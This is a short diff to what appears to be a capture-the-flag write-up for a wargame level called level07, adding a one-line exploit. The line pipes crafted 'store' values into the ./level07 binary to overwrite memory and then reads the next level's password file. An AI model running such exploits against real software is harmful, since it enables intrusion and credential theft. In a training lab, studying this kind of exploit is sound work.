@@ -41,3 +41,7 @@ Input command: quit
 $ whoami
 level08
 ```
+
+```
+(echo "store"; echo "4159090384"; echo "1073741938"; echo "store"; echo "4160264172"; echo "116"; echo "quit"; sleep 0.2; echo "cat /home/users/level08/.pass") | ./level07
+```
